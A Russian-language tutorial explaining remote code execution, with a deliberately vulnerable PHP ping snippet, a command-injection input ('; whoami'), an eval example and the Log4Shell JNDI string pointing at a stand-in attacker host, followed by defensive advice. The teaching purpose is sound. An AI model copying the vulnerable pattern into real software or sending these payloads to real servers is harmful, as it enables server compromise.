**RCE (Remote Code Execution)** — это «король» всех уязвимостей. Если SQL-инъекция позволяет украсть данные, то RCE позволяет захватить **весь сервер**.

Название переводится как **«Удаленное выполнение кода»**. Это означает, что атакующий может заставить сервер выполнить любую команду операционной системы (Linux или Windows), как если бы он сидел за его клавиатурой.

---

### **1. Почему это происходит? (Главный грех)**

RCE возникает, когда программа передает данные пользователя в функции, которые исполняют системный код, и при этом никак их не фильтрует.

**Классический пример: функция проверки пинга.** Разработчик хочет сделать инструмент, который проверяет, доступен ли другой сайт. Код на PHP выглядит так:

PHP

```
$target = $_GET['ip'];
system("ping -c 3 " . $target);
```

Если ты введешь `8.8.8.8`, сервер выполнит: `ping -c 3 8.8.8.8`.

Но в Linux (и Windows) есть **спецсимволы-разделители**, которые позволяют склеивать команды: `;`, `&&`, `|`. Хакер вводит: `8.8.8.8; whoami`. Сервер выполнит:

1. `ping -c 3 8.8.8.8`
    
2. `whoami` (команда, которая выводит имя текущего пользователя)

### **2. Виды RCE**

#### **A. Code Injection (Инъекция кода)**

Хакер вставляет код на языке программирования, на котором написан сайт (PHP, Python, Java).

- **Пример:** Функция `eval()` в PHP. Если передать в неё `eval("echo 'Hello';")`, она это исполнит. Если хакер передаст `eval(system('ls'));`, он увидит список файлов на сервере.
    

#### **B. Command Injection (Инъекция команд)**

Хакер вставляет команды самой операционной системы (как в примере с пингом выше).

#### **C. Уязвимости в десериализации**

Это сложный, но частый вид RCE. Когда программа преобразует данные из «упакованного» вида (например, из Java-объекта) обратно в «живой» объект, она может случайно исполнить вредоносный код, спрятанный внутри этой упаковки.

---

### **3. Как это выглядит для хакера (Reverse Shell)**

Просто читать файлы — это скучно. Хакер хочет получить полноценный терминал. Для этого используется **Reverse Shell (Обратный шелл)**.

1. Хакер открывает порт на своем компьютере и ждет соединения.
    
2. Через RCE он отправляет серверу команду: _«Подключись к моему компьютеру и отдай мне управление своим терминалом (bash)»_.
    
3. Сервер сам «стучится» к хакеру.
    
4. **Итог:** У хакера в консоли появляется полный доступ к серверу жертвы.
    

---

### **4. Реальный пример: Log4Shell (2021)**

Одна из самых громких RCE в истории. Ошибка была в библиотеке логирования Java (Log4j). Оказалось, что если просто отправить серверу строку типа `${jndi:ldap://hacker.com/a}`, сервер пытался её обработать и выполнял код, скачанный по этой ссылке. Уязвимыми оказались миллионы серверов: от Apple и Minecraft до систем Tesla.

---

### **5. Как защититься?**

1. **Никогда не используй опасные функции:** Избегай `eval()`, `exec()`, `system()`, `passthru()`.
    
2. **Используй API вместо системных команд:** Если нужно удалить файл, не вызывай `system("rm file.txt")`, используй встроенную функцию языка `unlink()`.
    
3. **Белые списки:** Если ввод команды неизбежен, разрешай только строго определенные символы (например, только цифры и точки для IP-адреса).
    
4. **Изоляция (Sandboxing):** Запускай приложение в контейнере (Docker) с минимальными правами. Даже если хакер получит RCE, он окажется заперт в пустой «коробке» без доступа к важным файлам системы.
